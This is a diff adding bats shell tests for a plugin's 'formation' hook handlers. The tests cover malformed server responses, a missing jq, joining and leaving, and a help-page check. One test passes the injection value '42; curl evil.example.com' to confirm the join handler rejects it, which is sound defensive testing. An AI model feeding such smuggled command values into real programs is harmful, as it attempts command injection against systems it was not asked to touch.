@@ -95,3 +95,80 @@ teardown() {
     [[ "$output" == *"transmissions?sessionId="* ]]
     [[ "$output" == *"since="* ]]
 }
+
+@test "hook: a malformed response is silent and does not fail" {
+    # QA round 1 found this guarded in code but exercised by no test. A local server that answers
+    # 200 with HTML instead of JSON is the real condition, so the guard is driven rather than
+    # described. Anything but silence here would put half-parsed text in front of the model.
+    command -v python >/dev/null 2>&1 || skip "python not available to serve a malformed response"
+    bash "${HANDLERS}/formation-state.sh" set 4242 "$CLAUDE_SESSION_ID"
+
+    local port=18731
+    python - "$port" <<'PYSRV' &
+import sys, BaseHTTPServer
+class H(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write('<html>this is not json at all</html>')
+    def log_message(self, *a): pass
+BaseHTTPServer.HTTPServer(('127.0.0.1', int(sys.argv[1])), H).serve_forever()
+PYSRV
+    local srv=$!
+    sleep 2
+
+    MMRY_API_URL="http://127.0.0.1:${port}" run bash "${HANDLERS}/formation-check.sh"
+    kill "$srv" 2>/dev/null || true
+
+    [ "$status" -eq 0 ]
+    [ -z "$output" ]
+}
+
+@test "hook: with no jq available it is silent and does not fail" {
+    # The other half of QA round 1's finding. MMRY_JQ_SKIP_SYSTEM and MMRY_JQ_VENDOR_DIR are the
+    # library's own test seams, so pointing the vendor directory at an empty one leaves no usable
+    # jq at all, which is the condition on an unsupported platform.
+    bash "${HANDLERS}/formation-state.sh" set 4242 "$CLAUDE_SESSION_ID"
+    local emptydir="${BATS_TEST_TMPDIR}/no-jq"
+    mkdir -p "$emptydir"
+
+    MMRY_JQ="" MMRY_JQ_SKIP_SYSTEM=1 MMRY_JQ_VENDOR_DIR="$emptydir"         MMRY_API_URL="http://127.0.0.1:9" run bash "${HANDLERS}/formation-check.sh"
+
+    [ "$status" -eq 0 ]
+    [ -z "$output" ]
+}
+
+@test "join: a non-numeric formation id is refused before any request is made" {
+    run bash "${HANDLERS}/formation-join.sh" "42; curl evil.example.com"
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"number"* ]]
+}
+
+@test "join: with no id it says what it needs rather than guessing" {
+    run bash "${HANDLERS}/formation-join.sh"
+    [ "$status" -ne 0 ]
+    [[ "$output" == *"Which formation"* ]]
+}
+
+@test "leave: with no formation it says so and succeeds" {
+    run bash "${HANDLERS}/formation-leave.sh"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"not in a formation"* ]]
+}
+
+@test "leave: it clears local state and is honest that the roster is untouched" {
+    bash "${HANDLERS}/formation-state.sh" set 4242 "$CLAUDE_SESSION_ID"
+    run bash "${HANDLERS}/formation-leave.sh"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"roster still lists this session"* ]]
+    run bash "${HANDLERS}/formation-state.sh" get "$CLAUDE_SESSION_ID"
+    [ -z "$output" ]
+}
+
+@test "command: /mmry:formation exists and is advertised in help" {
+    [ -f "${BATS_TEST_DIRNAME}/../../commands/formation.md" ]
+    run grep -c "formation" "${BATS_TEST_DIRNAME}/../../commands/help.md"
+    [ "$status" -eq 0 ]
+    [ "$output" -ge 1 ]
+}
